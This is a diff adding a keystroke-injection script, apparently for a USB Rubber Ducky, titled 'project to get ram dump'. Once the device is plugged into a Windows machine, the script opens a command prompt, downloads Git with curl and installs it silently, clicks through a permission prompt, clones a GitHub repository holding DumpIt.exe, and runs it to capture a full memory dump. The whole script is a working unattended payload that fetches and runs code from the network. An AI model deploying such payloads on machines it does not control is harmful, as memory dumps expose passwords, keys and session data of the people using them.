@@ -1,0 +1,45 @@
+REM Title: project to get ram dump
+
+DELAY 1000
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING curl -o Git-2.44.0-64-bit.exe -L https://github.com/git-for-windows/git/releases/download/v2.44.0.windows.1/Git-2.44.0-64-bit.exe
+ENTER
+DELAY 20000
+STRING Git-2.44.0-64-bit.exe /SILENT
+ENTER
+DELAY 3000
+LEFT
+DELAY 100
+ENTER
+DELAY 40000
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING git clone https://github.com/ShreyasMahajann/dumpit.git
+ENTER
+DELAY 5000
+STRING cd dumpit
+ENTER
+STRING DumpIt.exe
+ENTER
+DELAY 3000
+LEFT
+DELAY 100
+ENTER
+DELAY 3000
+STRING y
+ENTER
+DELAY 2000
+STRING EXIT
+DELAY 100
+ENTER
+DELAY 1000
+STRING EXIT
+DELAY 100
+ENTER
